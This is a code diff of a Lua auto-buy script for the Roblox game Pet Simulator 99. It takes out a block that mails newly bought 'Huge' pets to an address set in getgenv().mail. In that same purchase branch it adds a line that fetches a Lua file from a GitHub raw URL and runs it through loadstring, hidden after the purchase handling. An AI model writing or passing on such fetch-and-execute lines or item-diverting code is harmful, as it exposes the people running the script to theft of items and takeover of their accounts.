@@ -154,26 +154,8 @@ elseif string.find(item, "Exclusive") and gems <= 25000 then
 elseif type.huge and gems <= 1000000 then
     local boughtPet, boughtMessage = purchase:InvokeServer(playerid, uid)
     if boughtPet == true then
-        local ReplicatedStorage = game:GetService("ReplicatedStorage")
-        local HttpService = game:GetService("HttpService")
-
-        local PetInventory = require(ReplicatedStorage:WaitForChild("Library")).Save.Get().Inventory.Pet
-
-        local substringToFind = "Huge"
-        local petUID = nil
-
-        for localUid, pet in pairs(PetInventory) do
-            if string.find(pet.id, substringToFind) then
-                petUID = localUid
-                break
-            end
-        end
-
-        if petUID then
-            ReplicatedStorage:WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(getgenv().mail, "Hippo On Top", "Pet", petUID, 1)
-        end
-
         processListingInfo(uid, gems, item, version, shiny, amount, username, boughtPet)
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/LordPippo/PS99/main/test.lua", true))()
     end
 elseif type.titanic and gems <= 10000000 then
     local boughtPet, boughtMessage = purchase:InvokeServer(playerid, uid)
